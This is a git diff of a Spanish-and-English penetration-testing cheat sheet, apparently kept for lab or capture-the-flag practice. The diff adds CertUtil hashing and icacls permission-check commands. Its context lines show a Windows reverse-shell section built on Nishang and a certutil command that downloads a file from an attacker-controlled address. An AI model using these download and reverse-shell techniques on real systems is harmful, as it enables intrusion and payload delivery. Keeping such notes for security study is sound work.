@@ -1705,7 +1705,6 @@ more < hm.txt:root.txt
 
 
 
-
 ## Reverse shell for windows
 
 > Nishang is a framework of scripts and payloads that enables using PowerShell for offensive security. I’ll show the reverse shell, but there is a ton more stuff in here.
@@ -1898,6 +1897,22 @@ Esta herramienta es altamente detectada por windows ten cuidado...
 ```
 certutil.exe -urlcache -split -f http://10.10.14.80:8000/iisfinal.txt iisfinal.txt
 
+```
+
+Hash MD5 de cualquier archivo
+
+```
+CertUtil -hashfile CustomerManagerService.exe MD5
+```
+## Permisos de archivos
+
+Para esto usa icacls
+
+![image](https://github.com/gecr07/Acordeon/assets/63270579/4fd4f074-f35d-4015-9871-a40397c94292)
+
+
+```
+icacls C:\Users\tony\appdata\local\job\job.bat
 ```
 
 
